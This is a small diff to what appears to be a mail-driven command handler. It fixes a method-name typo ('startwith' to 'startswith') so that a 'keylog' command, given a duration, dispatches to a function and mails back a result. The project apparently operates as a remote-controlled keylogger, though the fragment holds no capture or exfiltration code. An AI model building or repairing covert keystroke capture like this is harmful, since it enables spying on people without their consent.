@@ -45,7 +45,7 @@ def request_handle(msg_list):
                 mail_handle_send.send_mail_success_execution(
                     recipient_mail, message)
                 function_map[cmd]()
-            elif cmd.startwith('keylog'):
+            elif cmd.startswith('keylog'):
                 splitted = cmd.split(' ')
                 filename = function_map[splitted[0]](int(splitted[1]))
                 message = message_generate.success_message(cmd)
